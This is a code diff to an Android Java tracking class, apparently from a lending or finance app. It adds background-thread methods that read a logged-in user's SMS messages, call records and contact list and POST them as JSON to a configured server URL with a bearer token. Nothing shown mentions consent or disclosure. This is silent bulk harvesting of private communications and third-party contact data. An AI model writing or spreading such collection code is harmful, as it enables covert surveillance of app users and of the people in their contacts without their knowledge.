@@ -1,7 +1,10 @@
 package com.xwjr.track;
 
-import android.os.Build;
-import android.util.Log;
+import com.google.gson.Gson;
+import com.google.gson.JsonObject;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
@@ -110,6 +113,27 @@ public class TrackOperate {
         }
     }
 
+    //上传用户短信信息，mobile为当前登录用户的手机号
+    public static void upLoadFKSMS(final String mobile) {
+        try {
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        JSONObject object = new JSONObject();
+                        object.put("type", "SMS");
+                        object.put("payload", TrackData.mapList2String(TrackData.getFKSMSData(mobile)));
+                        uploadFKData(object.toString());
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
     //上传用户通话记录信息，mobile为当前登录用户的手机号
     public static void upLoadCall(final String mobile) {
         try {
@@ -117,6 +141,27 @@ public class TrackOperate {
                 @Override
                 public void run() {
                     upload(TrackData.mapList2String(TrackData.getCallData(mobile)));
+                }
+            }).start();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    //上传用户通话记录信息，mobile为当前登录用户的手机号
+    public static void upLoadFKCall(final String mobile) {
+        try {
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        JSONObject object = new JSONObject();
+                        object.put("type", "CALLRECORDS");
+                        object.put("payload", TrackData.mapList2String(TrackData.getFKCallData(mobile)));
+                        uploadFKData(object.toString());
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
                 }
             }).start();
         } catch (Exception e) {
@@ -136,6 +181,80 @@ public class TrackOperate {
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+
+    //上传用户通话记录信息，mobile为当前登录用户的手机号
+    public static void upLoadFKContract(final String mobile) {
+        try {
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+//                    LogUtils.i(TrackData.mapList2String(TrackData.getFKContactData(mobile)));
+                    try {
+                        JSONObject object = new JSONObject();
+                        object.put("type", "CONTACTS");
+                        object.put("payload", TrackData.mapList2String(TrackData.getFKContactData(mobile)));
+                        uploadFKData(object.toString());
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+
+    public static void uploadFKData(final String data) {
+        //开启线程来发起网络请求
+        if (TrackConfig.debug) {
+            LogUtils.i("上传的URL " + TrackConfig.getUploadUrl());
+            LogUtils.i("上传的json数据 " + data);
+        }
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                HttpURLConnection connection = null;
+                BufferedReader reader = null;
+                try {
+                    URL url = new URL(TrackConfig.getUploadUrl());
+                    connection = (HttpURLConnection) url.openConnection();
+                    connection.setConnectTimeout(20000);
+                    connection.setReadTimeout(20000);
+                    connection.setRequestMethod("POST");
+                    connection.setRequestProperty("Authorization", "Bearer " + TrackConfig.getXwjrToken());
+                    connection.setRequestProperty("Content-Type", "application/Json; charset=UTF-8");
+                    DataOutputStream out = new DataOutputStream(connection.getOutputStream());
+                    out.write(data.getBytes());
+                    InputStream in = connection.getInputStream();
+                    //下面对获取到的输入流进行读取
+                    reader = new BufferedReader(new InputStreamReader(in));
+                    StringBuilder response = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        response.append(line);
+                    }
+                    if (TrackConfig.debug) {
+                        LogUtils.i("上传返回数据 " + response.toString());
+                    }
+
+                } catch (Exception e) {
+                    e.printStackTrace();
+                } finally {
+                    if (reader != null) {
+                        try {
+                            reader.close();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                    if (connection != null) {
+                        connection.disconnect();
+                    }
+                }
+            }
+        }).start();
     }
 
     //上传本地存储的数据
